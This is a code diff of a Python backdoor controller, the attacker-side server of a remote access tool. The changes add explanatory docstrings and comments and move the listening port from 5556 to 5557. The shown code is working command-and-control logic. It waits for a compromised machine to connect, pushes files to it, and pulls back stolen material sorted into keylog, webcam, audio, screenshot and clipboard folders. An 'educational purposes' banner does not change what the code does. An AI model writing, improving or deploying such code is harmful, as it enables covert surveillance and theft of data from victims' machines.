@@ -18,15 +18,37 @@ class BackdoorController:
     """Backdoor controller for the attacker machine"""
 
     def __init__(self, host='0.0.0.0', port=5555):
+        """
+        Initialize the backdoor controller (attacker-side server)
+        
+        Args:
+            host: IP address to bind to (0.0.0.0 = listen on all interfaces)
+            port: Port number to listen on for incoming connections
+        """
+        # Host and port configuration
         self.host = host
         self.port = port
+        
+        # Create main server socket for accepting connections
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Allow socket reuse to avoid "address already in use" errors
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        # Socket for communicating with target machine
         self.target_socket = None
+        # Address (IP, port) of connected target
         self.target_address = None
     
     def reliable_send(self, data):
-        """Send data reliably (encoded as JSON)"""
+        """
+        Send data reliably to the target machine
+        
+        Converts data to JSON format and encodes to bytes before sending.
+        This ensures data integrity during transmission.
+        
+        Args:
+            data: Any JSON-serializable data to send to target
+        """
         try:
             jsondata = json.dumps(data)
             self.target_socket.send(jsondata.encode())
@@ -34,7 +56,15 @@ class BackdoorController:
             print(f"[!] Error sending data: {e}")
     
     def reliable_recv(self):
-        """Receive data reliably (expects JSON data)"""
+        """
+        Receive data reliably from the target machine
+        
+        Receives data in chunks and attempts to parse as JSON.
+        Continues receiving until valid JSON is obtained.
+        
+        Returns:
+            Parsed JSON data from target, or None if error occurs
+        """
         data = ''
         while True:
             try:
@@ -47,7 +77,14 @@ class BackdoorController:
                 return None
     
     def upload_file(self, file_name):
-        """Upload a file to the target"""
+        """
+        Upload a file from attacker machine to target machine
+        
+        Reads the specified file and sends its binary content to target.
+        
+        Args:
+            file_name: Path to the file on attacker machine to upload
+        """
         try:
             with open(file_name, 'rb') as f:
                 self.target_socket.send(f.read())
@@ -58,7 +95,15 @@ class BackdoorController:
             print(f"[!] Error uploading file: {e}")
     
     def download_file(self, file_name):
-        """Download a file from the target"""
+        """
+        Download a file from target machine to attacker machine
+        
+        Receives file content in chunks and saves to appropriate directory
+        based on file type. Automatically organizes files into logs subdirectories.
+        
+        Args:
+            file_name: Name or path of file on target machine to download
+        """
         try:
             # Determine the appropriate logs subdirectory based on file type
             local_file = self._get_local_download_path(file_name)
@@ -81,7 +126,23 @@ class BackdoorController:
             print(f"[!] Error downloading file: {e}")
     
     def _get_local_download_path(self, remote_file):
-        """Determine the local download path based on remote file path"""
+        """
+        Determine the local download path based on remote file path
+        
+        Organizes downloaded files into appropriate subdirectories:
+        - screenshots -> logs/screenshots/
+        - audio -> logs/audio/
+        - recordings -> logs/recordings/
+        - webcam -> logs/webcam/
+        - keylog -> logs/keylog/
+        - clipboard -> logs/clipboard/
+        
+        Args:
+            remote_file: Path or name of file from target machine
+            
+        Returns:
+            Organized local file path
+        """
         # Extract just the filename if it's a full path
         filename = os.path.basename(remote_file)
         
@@ -103,13 +164,24 @@ class BackdoorController:
             return filename
     
     def start_listener(self):
-        """Start listening for incoming connections"""
+        """
+        Start listening for incoming connections from target machine
+        
+        Binds to specified host:port and waits for target to connect.
+        Once connected, requests initial system information from target.
+        
+        Returns:
+            True if connection established successfully, False otherwise
+        """
         try:
+            # Bind socket to host and port
             self.server_socket.bind((self.host, self.port))
+            # Listen for up to 5 queued connections
             self.server_socket.listen(5)
             print(f"[+] Listening on {self.host}:{self.port}")
             print("[*] Waiting for incoming connections...")
             
+            # Accept incoming connection (blocks until connection received)
             self.target_socket, self.target_address = self.server_socket.accept()
             print(f"[+] Connection established from {self.target_address[0]}:{self.target_address[1]}")
             
@@ -375,16 +447,21 @@ class BackdoorController:
 
 
 def main():
-    """Main entry point"""
+    """
+    Main entry point for the backdoor server (attacker side)
+    
+    Configures and starts the backdoor controller to listen for
+    incoming connections from target machines.
+    """
     print("=" * 70)
     print("  Backdoor Server - ATTACKER SIDE")
     print("  This program LISTENS for incoming connections")
     print("  WARNING: For Educational Purposes Only!")
     print("=" * 70)
     
-    # Configuration
+    # Configuration - these must match the settings in backdoor.py on target
     HOST = '0.0.0.0'  # Listen on all interfaces (0.0.0.0)
-    PORT = 5556     # Port to listen on (must match ATTACKER_PORT in backdoor.py)
+    PORT = 5557     # Port to listen on (must match ATTACKER_PORT in backdoor.py)
     
     # Allow command-line arguments for port
     if len(sys.argv) > 1:
